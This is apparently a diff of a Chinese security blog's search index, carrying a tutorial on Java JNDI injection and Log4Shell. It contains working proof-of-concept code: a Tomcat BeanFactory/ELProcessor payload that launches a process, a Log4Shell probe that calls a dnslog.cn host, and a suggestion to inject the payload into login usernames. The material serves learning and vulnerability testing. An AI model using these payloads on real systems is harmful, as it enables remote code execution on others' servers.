+2.对用户输入的内容进行过滤,过滤掉<code>&lt;!DOCTYPE</code>和<code>&lt;!ENTITY</code>,或者<code>SYSTEM</code>和<code>PUBLIC</code>。</p>
+]]></content>
+      <categories>
+        <category>技术</category>
+      </categories>
+      <tags>
+        <tag>xxe</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>java反序列化之jndi</title>
+    <url>/post/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bjndi/</url>
+    <content><![CDATA[<h1 id="jndi加载本地类利用">jndi加载本地类利用</h1>
+<p>上一个篇中讲了jndi结合RMI的利用,然而这个利用只适用于<code> JDK &lt; 8u191</code>的情况,在高版本的jdk中,我们可以通过<code>加载本地类</code>的方法进行命令执行。</p>
+<p>之前在Reference中传入了一个工厂类名,然后让程序去找这个工厂类的位置,最终加载到了我们所构建的恶意类并调用了其构造方法,而这次我们将直接利用本地存在的工厂类去执行命令。</p>
+<p>这里利用的是<code>tomcat8</code>带有的<code>BeanFactory类</code>,这个类中带有method.invoke可以通过反射来调用任意方法。</p>
+<p>首先导入依赖（这里org.apache.el如果导入失败的话需要换个源,我是用<code>阿里云</code>的源）：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-catalina<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.5.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.el<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>com.springsource.org.apache.el<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>7.0.26<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>poc代码：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=eval&quot;</span>));</span><br><span class="line">ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;calc&#x27;]).start()\&quot;)&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">com</span>.sun.jndi.rmi.registry.ReferenceWrapper(ref);</span><br><span class="line">registry.bind(<span class="string">&quot;Object&quot;</span>, referenceWrapper);</span><br></pre></td></tr></table></figure>
+<p>客户端：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Object object=<span class="keyword">new</span> <span class="title class_">InitialContext</span>().lookup(<span class="string">&quot;rmi://127.0.0.1:1099/Object&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>效果：</p>
+<p><img src="image-20230402123833616.png" alt="image-20230402123833616"></p>
+<p>利用链：<br>
+InitialContext#lookup</p>
+<p>GenericURLContext#lookup</p>
+<p>RegistryContext#lookup</p>
+<p>RegistryContext#decodeObject</p>
+<p>NamingManager#getObjectInstance</p>
+<p>BeanFactory#getObjectInstance</p>
+<p>反射执行的语句：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">new</span>  <span class="title class_">ELProcessor</span>()).eval(<span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new  java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;calc&#x27;]).start()\&quot;)&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>解释：</p>
+<ol>
+<li>“”.getClass() 返回字符串对象的Class对象。</li>
+<li>Class.forName() 可以根据类的名称返回对应的Class对象。</li>
+<li>newInstance() 可以使用Class对象实例化一个对象。</li>
+<li>getEngineByName() 返回指定名称的脚本引擎对象,这里是JavaScript引擎对象。</li>
+<li>eval() 方法用于执行脚本。</li>
+<li>ProcessBuilder 类可以启动一个新进程并执行操作系统命令。</li>
+</ol>
+<h1 id="jndi-log4j2">jndi+log4j2</h1>
+<p>Log4j2是Apache软件基金会下的一个开源项目,是Java编程语言的一种流行的、模块化的<code>日志记录工具</code>,用于记录应用程序的运行状态信息和调试信息。</p>
+<p>而在2021年11月log4j2爆出了一个代码执行漏洞,影响范围非常大,2.14.1版本及之前的都存在该漏洞</p>
+<p>而这个漏洞的利用正好与jndi注入有关</p>
+<h2 id="环境搭建">环境搭建</h2>
+<p>首先导入依赖（版本小于2.14.1即可）：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>编写log4j2的配置文件</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Configuration</span> <span class="attr">status</span>=<span class="string">&quot;WARN&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--全局参数--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Property</span> <span class="attr">name</span>=<span class="string">&quot;pattern&quot;</span>&gt;</span>%d&#123;yyyy-MM-dd HH:mm:ss,SSS&#125; %5p %c&#123;1&#125;:%L - %m%n<span class="tag">&lt;/<span class="name">Property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Property</span> <span class="attr">name</span>=<span class="string">&quot;logDir&quot;</span>&gt;</span>/data/logs/dust-server<span class="tag">&lt;/<span class="name">Property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Loggers</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Root</span> <span class="attr">level</span>=<span class="string">&quot;INFO&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">AppenderRef</span> <span class="attr">ref</span>=<span class="string">&quot;console&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">AppenderRef</span> <span class="attr">ref</span>=<span class="string">&quot;rolling_file&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Loggers</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Appenders</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 定义输出到控制台 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Console</span> <span class="attr">name</span>=<span class="string">&quot;console&quot;</span> <span class="attr">target</span>=<span class="string">&quot;SYSTEM_OUT&quot;</span> <span class="attr">follow</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--控制台只输出level及以上级别的信息--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ThresholdFilter</span> <span class="attr">level</span>=<span class="string">&quot;INFO&quot;</span> <span class="attr">onMatch</span>=<span class="string">&quot;ACCEPT&quot;</span> <span class="attr">onMismatch</span>=<span class="string">&quot;DENY&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">PatternLayout</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">Pattern</span>&gt;</span>$&#123;pattern&#125;<span class="tag">&lt;/<span class="name">Pattern</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">PatternLayout</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Console</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 同一来源的Appender可以定义多个RollingFile,定义按天存储日志 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">RollingFile</span> <span class="attr">name</span>=<span class="string">&quot;rolling_file&quot;</span></span></span><br><span class="line"><span class="tag">                     <span class="attr">fileName</span>=<span class="string">&quot;$&#123;logDir&#125;/dust-server.log&quot;</span></span></span><br><span class="line"><span class="tag">                     <span class="attr">filePattern</span>=<span class="string">&quot;$&#123;logDir&#125;/dust-server_%d&#123;yyyy-MM-dd&#125;.log&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ThresholdFilter</span> <span class="attr">level</span>=<span class="string">&quot;INFO&quot;</span> <span class="attr">onMatch</span>=<span class="string">&quot;ACCEPT&quot;</span> <span class="attr">onMismatch</span>=<span class="string">&quot;DENY&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">PatternLayout</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">Pattern</span>&gt;</span>$&#123;pattern&#125;<span class="tag">&lt;/<span class="name">Pattern</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">PatternLayout</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Policies</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">TimeBasedTriggeringPolicy</span> <span class="attr">interval</span>=<span class="string">&quot;1&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">Policies</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 日志保留策略,配置只保留七天 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">DefaultRolloverStrategy</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">Delete</span> <span class="attr">basePath</span>=<span class="string">&quot;$&#123;logDir&#125;/&quot;</span> <span class="attr">maxDepth</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">IfFileName</span> <span class="attr">glob</span>=<span class="string">&quot;dust-server_*.log&quot;</span> /&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">IfLastModified</span> <span class="attr">age</span>=<span class="string">&quot;7d&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">Delete</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">DefaultRolloverStrategy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">RollingFile</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Appenders</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>测试：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LOGtest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(LongFunction.class);</span><br><span class="line">        String username= <span class="string">&quot;$&#123;java:os&#125;&quot;</span>;  ;</span><br><span class="line">        logger.error(<span class="string">&quot;Hello, &#123;&#125;&quot;</span>,username);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="image-20230402194044347.png" alt="image-20230402194044347"></p>
+<p>这里就输出了操作系统的一些信息,这实际上是log4j2自带的一些功能</p>
+<p>但除此之外,它还支持调用<code>lookup</code>,那么这里就会存在我们之前所说的命令执行漏洞</p>
+<h2 id="漏洞探测">漏洞探测</h2>
+<p>修改测试代码如下：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LOGtest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(LongFunction.class);</span><br><span class="line">        String username= <span class="string">&quot;$&#123;jndi:rmi://foei54.dnslog.cn/Object&#125;&quot;</span>;  ;</span><br><span class="line">        logger.error(<span class="string">&quot;Hello, &#123;&#125;&quot;</span>,username);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>foei54.dnslog.cn为我们在dnslog平台得到的url</p>
+<p>运行测试代码并查看dns记录,出现以下结果则说明漏洞存在</p>
+<p><img src="image-20230402200004246.png" alt="image-20230402200004246"></p>
+<h2 id="漏洞利用">漏洞利用</h2>
+<p>修改测试代码如下：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LOGtest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(LongFunction.class);</span><br><span class="line">        String username= <span class="string">&quot;$&#123;jndi:rmi://127.0.0.1:1099/Object&#125;&quot;</span>;  ;</span><br><span class="line">        logger.error(<span class="string">&quot;Hello, &#123;&#125;&quot;</span>,username);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>将之前测试jndi的服务端程序运行起来,然后运行测试代码</p>
+<p>效果：</p>
+<p><img src="image-20230402194654780.png" alt="image-20230402194654780"></p>
+<p>可以看到命令被成功执行了</p>
+<p>实际上在正常的生产环境中,log4j2会写入非常多的事件,哪怕是一个简单的用户登录事件,这时候我们就可以修改用户名的内容为${jndi:rmi://foei54.dnslog.cn/Object}来测试漏洞是否存在。</p>
+<p>参考：</p>
+<p><a href="https://xz.aliyun.com/t/8214">JNDI注入学习</a></p>
+<p><a href="https://blog.csdn.net/lumingzhu111/article/details/121871114">一问三不知之log4j2漏洞简析</a></p>
+<p><a href="https://www.freebuf.com/articles/web/341857.html">深入学习 Log4j2 漏洞原理以及绕过手段</a></p>
+]]></content>
+      <categories>
+        <category>JAVA</category>
+      </categories>
+      <tags>
+        <tag>反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>java反序列化之shiro550</title>
     <url>/post/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bshiro550/</url>
     <content><![CDATA[<h1 id="环境搭建">环境搭建</h1>
@@ -656,79 +729,6 @@ URL.hashCode()-&gt;handler.hashCode()-&gt;getHostAddress()</p>
 <p>这里需要注意,实验中使用的commons-beanutils的版本是<code>1.8.3</code>,而ysoserial中使用的版本是<code>1.9.2</code>,所以使用ysoserial来打本实验的时候会出现利用失败</p>
 <p><img src="image-20230327210100012.png" alt="image-20230327210100012"></p>
 <p>参考视频链接：<a href="https://www.bilibili.com/video/BV1uf4y1T7Rq/?share_source=copy_web&amp;vd_source=c7f71b9392bbbd1398d21bf06f9a793e">Shiro反序列化漏洞</a></p>
-]]></content>
-      <categories>
-        <category>JAVA</category>
-      </categories>
-      <tags>
-        <tag>反序列化</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>java反序列化之jndi</title>
-    <url>/post/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bjndi/</url>
-    <content><![CDATA[<h1 id="jndi加载本地类利用">jndi加载本地类利用</h1>
-<p>上一个篇中讲了jndi结合RMI的利用,然而这个利用只适用于<code> JDK &lt; 8u191</code>的情况,在高版本的jdk中,我们可以通过<code>加载本地类</code>的方法进行命令执行。</p>
-<p>之前在Reference中传入了一个工厂类名,然后让程序去找这个工厂类的位置,最终加载到了我们所构建的恶意类并调用了其构造方法,而这次我们将直接利用本地存在的工厂类去执行命令。</p>
-<p>这里利用的是<code>tomcat8</code>带有的<code>BeanFactory类</code>,这个类中带有method.invoke可以通过反射来调用任意方法。</p>
-<p>首先导入依赖（这里org.apache.el如果导入失败的话需要换个源,我是用<code>阿里云</code>的源）：</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-catalina<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.5.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.el<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>com.springsource.org.apache.el<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>7.0.26<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>poc代码：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=eval&quot;</span>));</span><br><span class="line">ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;calc&#x27;]).start()\&quot;)&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">com</span>.sun.jndi.rmi.registry.ReferenceWrapper(ref);</span><br><span class="line">registry.bind(<span class="string">&quot;Object&quot;</span>, referenceWrapper);</span><br></pre></td></tr></table></figure>
-<p>客户端：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Object object=<span class="keyword">new</span> <span class="title class_">InitialContext</span>().lookup(<span class="string">&quot;rmi://127.0.0.1:1099/Object&quot;</span>);</span><br></pre></td></tr></table></figure>
-<p>效果：</p>
-<p><img src="image-20230402123833616.png" alt="image-20230402123833616"></p>
-<p>利用链：<br>
-InitialContext#lookup</p>
-<p>GenericURLContext#lookup</p>
-<p>RegistryContext#lookup</p>
-<p>RegistryContext#decodeObject</p>
-<p>NamingManager#getObjectInstance</p>
-<p>BeanFactory#getObjectInstance</p>
-<p>反射执行的语句：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">new</span>  <span class="title class_">ELProcessor</span>()).eval(<span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new  java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;calc&#x27;]).start()\&quot;)&quot;</span>);</span><br></pre></td></tr></table></figure>
-<p>解释：</p>
-<ol>
-<li>“”.getClass() 返回字符串对象的Class对象。</li>
-<li>Class.forName() 可以根据类的名称返回对应的Class对象。</li>
-<li>newInstance() 可以使用Class对象实例化一个对象。</li>
-<li>getEngineByName() 返回指定名称的脚本引擎对象,这里是JavaScript引擎对象。</li>
-<li>eval() 方法用于执行脚本。</li>
-<li>ProcessBuilder 类可以启动一个新进程并执行操作系统命令。</li>
-</ol>
-<h1 id="jndi-log4j2">jndi+log4j2</h1>
-<p>Log4j2是Apache软件基金会下的一个开源项目,是Java编程语言的一种流行的、模块化的<code>日志记录工具</code>,用于记录应用程序的运行状态信息和调试信息。</p>
-<p>而在2021年11月log4j2爆出了一个代码执行漏洞,影响范围非常大,2.14.1版本及之前的都存在该漏洞</p>
-<p>而这个漏洞的利用正好与jndi注入有关</p>
-<h2 id="环境搭建">环境搭建</h2>
-<p>首先导入依赖（版本小于2.14.1即可）：</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>编写log4j2的配置文件</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Configuration</span> <span class="attr">status</span>=<span class="string">&quot;WARN&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--全局参数--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Property</span> <span class="attr">name</span>=<span class="string">&quot;pattern&quot;</span>&gt;</span>%d&#123;yyyy-MM-dd HH:mm:ss,SSS&#125; %5p %c&#123;1&#125;:%L - %m%n<span class="tag">&lt;/<span class="name">Property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Property</span> <span class="attr">name</span>=<span class="string">&quot;logDir&quot;</span>&gt;</span>/data/logs/dust-server<span class="tag">&lt;/<span class="name">Property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Loggers</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Root</span> <span class="attr">level</span>=<span class="string">&quot;INFO&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">AppenderRef</span> <span class="attr">ref</span>=<span class="string">&quot;console&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">AppenderRef</span> <span class="attr">ref</span>=<span class="string">&quot;rolling_file&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Loggers</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Appenders</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 定义输出到控制台 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Console</span> <span class="attr">name</span>=<span class="string">&quot;console&quot;</span> <span class="attr">target</span>=<span class="string">&quot;SYSTEM_OUT&quot;</span> <span class="attr">follow</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--控制台只输出level及以上级别的信息--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ThresholdFilter</span> <span class="attr">level</span>=<span class="string">&quot;INFO&quot;</span> <span class="attr">onMatch</span>=<span class="string">&quot;ACCEPT&quot;</span> <span class="attr">onMismatch</span>=<span class="string">&quot;DENY&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">PatternLayout</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">Pattern</span>&gt;</span>$&#123;pattern&#125;<span class="tag">&lt;/<span class="name">Pattern</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">PatternLayout</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Console</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 同一来源的Appender可以定义多个RollingFile,定义按天存储日志 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">RollingFile</span> <span class="attr">name</span>=<span class="string">&quot;rolling_file&quot;</span></span></span><br><span class="line"><span class="tag">                     <span class="attr">fileName</span>=<span class="string">&quot;$&#123;logDir&#125;/dust-server.log&quot;</span></span></span><br><span class="line"><span class="tag">                     <span class="attr">filePattern</span>=<span class="string">&quot;$&#123;logDir&#125;/dust-server_%d&#123;yyyy-MM-dd&#125;.log&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ThresholdFilter</span> <span class="attr">level</span>=<span class="string">&quot;INFO&quot;</span> <span class="attr">onMatch</span>=<span class="string">&quot;ACCEPT&quot;</span> <span class="attr">onMismatch</span>=<span class="string">&quot;DENY&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">PatternLayout</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">Pattern</span>&gt;</span>$&#123;pattern&#125;<span class="tag">&lt;/<span class="name">Pattern</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">PatternLayout</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Policies</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">TimeBasedTriggeringPolicy</span> <span class="attr">interval</span>=<span 